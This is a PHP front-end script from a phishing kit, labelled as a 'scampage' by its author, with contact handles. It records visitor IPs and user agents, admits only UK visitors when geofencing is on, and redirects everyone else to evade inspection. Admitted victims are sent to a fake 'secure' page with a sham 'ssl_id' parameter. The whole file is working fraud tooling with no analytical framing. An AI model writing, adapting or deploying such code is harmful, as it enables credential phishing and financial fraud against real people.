<?php
//SCAMPAGE BY BLACKCODER.RU
//Jabber: slackerz@jodo.im
//ICQ: 713566330
session_start();
ini_set('display_errors', true);
date_default_timezone_set('Europe/London');
require_once 'config/config.php';
require_once 'config/functions.php';

$ip = $_SERVER['REMOTE_ADDR'];

if ($onlyUK === 1) {
	
	$country = getCountry($_SERVER['REMOTE_ADDR']);
	
	if ($country === 'GB') {
		
		addVisit($ip, $_SERVER['HTTP_USER_AGENT'], 'ACCEPTED');
		$_SESSION['passed'] = 1;
		header('Location: secure/83322502aa046f6424cf3019cce26555/index.php?ssl_id=' . getString());
		exit;
		
	} else {
		
		addVisit($ip, $_SERVER['HTTP_USER_AGENT'], 'REJECTED');
		header('Location: ' . $redirect);
		exit;	
		
	}
	
} else {
	
	addVisit($ip, $_SERVER['HTTP_USER_AGENT'], 'ACCEPTED');
	$_SESSION['passed'] = 1;
	header('Location: secure/83322502aa046f6424cf3019cce26555/index.php?ssl_id=' . getString());
	exit;
	
}

//SCAMPAGE BY BLACKCODER.RU
//Jabber: slackerz@jodo.im
//ICQ: 713566330
?>